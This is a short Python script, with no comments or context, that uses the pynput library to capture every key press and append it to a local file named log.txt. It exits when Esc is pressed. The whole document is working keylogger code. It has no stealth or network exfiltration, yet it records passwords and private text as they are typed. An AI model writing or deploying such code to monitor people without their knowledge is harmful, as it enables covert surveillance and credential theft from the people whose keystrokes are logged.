from pynput.keyboard import Listener

def write_key (key):
    key = str(key)
    key = key.replace("'","")
    if (key == "Key.esc"):
        raise SystemExit(0)
    ds=["Key.F12","Key.backspace","Key.space","Key.left"]
    for keyterm in ds:
        key=key.replace(keyterm," ")
    key = key.replace("Key.enter", "\n")
    with open("log.txt", "a",encoding="utf8") as file:
        file.write(key)

with Listener(on_press=write_key) as listener:
    listener.join()
